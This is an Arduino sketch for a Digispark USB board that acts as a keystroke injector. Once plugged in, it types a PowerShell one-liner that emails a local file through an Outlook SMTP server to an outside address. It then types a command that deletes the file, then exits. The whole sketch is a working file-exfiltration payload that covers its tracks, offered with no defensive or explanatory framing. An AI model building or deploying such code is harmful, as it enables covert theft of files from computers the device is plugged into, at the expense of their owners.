#include "DigiKeyboard.h"

void setup() {
}


void loop() {
  
  DigiKeyboard.delay(2000);
  DigiKeyboard.println(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.outlook.com'); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR_EMAIL@email.com', 'password'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'SENDER_EMAIL.email.com'; $ReportEmail.To.Add('RECIEVER_EMAIL@email.com'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add('C:\\path\\to\\file.txt'); $SMTPInfo.Send($ReportEmail)"));
  DigiKeyboard.delay(5000);
  DigiKeyboard.print("Remove-Item -path C://path//to//file.txt");
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(500);
}
